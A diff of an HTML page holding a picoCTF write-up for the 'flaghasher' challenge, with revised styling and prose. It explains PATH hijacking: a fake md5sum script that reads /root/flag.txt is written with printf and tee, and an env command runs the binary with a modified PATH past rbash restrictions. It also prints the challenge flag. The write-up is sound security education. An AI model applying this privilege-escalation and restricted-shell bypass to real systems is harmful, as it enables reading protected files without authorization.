@@ -11,14 +11,14 @@
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
     <style>
-        /* --- Global Variables (Same as your Main Site) --- */
+        /* --- Global Variables --- */
         :root {
             --bg-color: #f4f4f5;
             --text-main: #18181b;
             --text-muted: #52525b;
             --accent-color: #0d9488;
             --code-bg: #27272a;
-            --code-text: #4ade80; /* Hacker Green */
+            --code-text: #4ade80; 
             --font-main: 'Outfit', sans-serif;
             --font-code: 'Space Mono', monospace;
         }
@@ -87,15 +87,6 @@
             font-size: 1.2rem;
         }
 
-        h3 {
-            font-family: var(--font-main);
-            color: var(--text-main);
-            font-weight: 700;
-            margin-top: 25px;
-            margin-bottom: 10px;
-            font-size: 1.1rem;
-        }
-
         p {
             line-height: 1.8;
             margin-bottom: 20px;
@@ -109,15 +100,16 @@
             font-family: var(--font-code);
             padding: 15px;
             border-radius: 6px;
-            overflow-x: auto; /* Allows scrolling if text is too long */
+            overflow-x: auto; 
             margin-bottom: 20px;
             font-size: 0.9rem;
             border-left: 4px solid var(--accent-color);
+            white-space: pre-wrap;
         }
 
         /* Styling the "Given Challenge" Quote */
         blockquote {
-            background-color: #f0fdfa; /* Light Teal */
+            background-color: #f0fdfa; 
             border-left: 4px solid var(--accent-color);
             padding: 15px;
             margin-bottom: 25px;
@@ -133,6 +125,16 @@
             border-radius: 4px;
             font-family: var(--font-code);
             font-weight: 700;
+        }
+        
+        /* List styling for explanations */
+        ul {
+            list-style-position: inside;
+            margin-bottom: 20px;
+        }
+        li {
+            margin-bottom: 10px;
+            line-height: 1.6;
         }
 
     </style>
@@ -151,76 +153,85 @@
             Here is a binary that has enough privilege to read the content of the flag file but will only let you know its hash. If only it could just give you the actual content!
         </blockquote>
 
-        <p>First, connect to the challenge by launching the instance and connecting through SSH:</p>
+        <p>Firstly connect to the challenge by launching the instance and connecting through ssh(secure shell)</p>
 
         <div class="code-block">
 ssh username@ipaddress -p port_number
         </div>
 
-        <p>After logging in, I casually entered the <code>ls</code> command to see the contents and found nothing. Then, I checked my current location with <code>pwd</code> and saw I was in <code>/home/ctf-player</code>.</p>
+        <p>After getting logged in I just casually entered the command <code>ls</code> for seeing the contents and found nothing.</p>
+
+        <p>Then I entered the command <code>pwd</code> for checking where I am and got this <code>/home/ctf-player</code></p>
         
-        <p>In the description, it was suggested to run the binary. I typed <code>flaghasher</code> in the command line:</p>
+        <p>In the description he said to run the flaghasher binary file so just type <code>flaghasher</code> in your command line</p>
 
         <div class="code-block">
 Computing the MD5 hash of /root/flag.txt....
 ecbb7393ae1660f00340b6194d5bf6a6  /root/flag.txt
         </div>
 
-        <p>From this output, we can understand that the flag is located at <code>/root/flag.txt</code>. However, this is a binary exploitation challenge, so we don't need to crack the hash. Instead, this challenge relies on a <strong>Path Hijacking Vulnerability</strong>.</p>
+        <p>From this we can understand that flag is at /root/flag.txt</p>
 
-        <h2>// Path Hijacking Analysis</h2>
-        <h3>What is PATH hijacking?</h3>
-        <p>When a program runs a command like <code>md5sum</code>, the system searches for the <code>md5sum</code> executable by looking through the directories listed in the <code>PATH</code> environment variable. If we place a fake <code>md5sum</code> script earlier in the <code>PATH</code> sequence, the system will execute our script instead of the real one.</p>
+        <p>But this challenge is of binary exploitation so we no need to try to crack the hash so this challenge comes under path hijacking vulnerability</p>
 
-        <p>Since we are in a restricted shell (rbash), direct redirection using <code>&gt;</code> is blocked:</p>
+        <h2>// What is PATH hijacking?</h2>
+        
+        <p>When a program runs a command like md5sum:</p>
+        <ul>
+            <li>The system searches for md5sum using the PATH</li>
+            <li>If we place a fake md5sum earlier in PATH, it will be executed instead</li>
+        </ul>
+
+        <p><code>tee</code> is used to write into files without shell redirection. Here we should do without shell direction as it is restricted, you can see that if you enter the command</p>
 
         <div class="code-block">
 echo '...' > md5sum  
-rbash: restricted: cannot redirect output
+rbash: restricted: cannot redirect output 
         </div>
 
-        <p>To bypass this, we can use the <code>tee</code> command, which allows writing to files without shell redirection.</p>
-
-        <h2>// Exploitation</h2>
-        <p>We will create a fake <code>md5sum</code> script using <code>printf</code> and <code>tee</code>:</p>
+        <p>So use this command instead</p>
 
         <div class="code-block">
 printf '#!/bin/sh\ncat /root/flag.txt\n' | tee md5sum
         </div>
 
-        <h3>Explanation of the command:</h3>
-        <ul>
-            <li><code>#!/bin/sh</code> (Shebang): Tells the OS this file is a script to be executed using the shell.</li>
-            <li><code>cat /root/flag.txt</code>: The payload that reads the flag content.</li>
-            <li><code>|</code> (Pipe): Takes the output from printf and sends it as input to the next command.</li>
-            <li><code>tee</code>: Reads the input and writes it to both the screen and the file named <code>md5sum</code>.</li>
-        </ul>
+        <h2>// Explanation of the command</h2>
+        
+        <p><code>#!/bin/sh</code> is called shebang and it tells the os this file is a script and it should be executed using shell</p>
+        <p><code>cat /root/flag.txt</code> It is the payload which reads the contents in flag.txt</p>
+        <p><code>|</code> This operator takes the output from printf and sends it as input to the next command</p>
+        <p><code>tee</code> This one reads the input and writes in two places one is your terminal output screen and other is of file</p>
+        <p><code>md5sum</code> is the name of the file tee creates</p>
 
-        <p>Next, we must make our new script executable:</p>
+        <p>After entering the above command make it executable</p>
 
         <div class="code-block">
 chmod +x md5sum
         </div>
 
-        <p>Trying to modify the PATH variable directly failed because it is read-only in this restricted shell:</p>
+        <p>Use this command for making the file excutable</p>
+
+        <p>After that I used the command which got failed</p>
 
         <div class="code-block">
 PATH=.:$PATH flaghasher  
 rbash: PATH: readonly variable
         </div>
 
-        <p>However, we can use the <code>env</code> command to launch a program with a modified environment, effectively bypassing the rbash restriction:</p>
+        <p>It is not allowing to modify environment variables directly. So I used this command instead</p>
 
         <div class="code-block">
 env PATH=.:$PATH flaghasher
         </div>
 
+        <p>The <code>env</code> command launches a program with a custom environment bypassing rbash restrictions</p>
+
         <h2>// The Result</h2>
-        <p>Running the final command executes our fake <code>md5sum</code> instead of the system's hashing tool:</p>
+        <p>With these we will get our flag</p>
 
         <div class="code-block">
-ctf-player@pico-chall$ env PATH=.:$PATH flaghasher
-Computing the MD5 hash of /root/flag.txt....   
+ctf-player@pico-chall$ env PATH=.:$PATH flaghasher<br>
+Computing the MD5 hash of /root/flag.txt....   <br>
 picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_364b3672}
         </div>
 
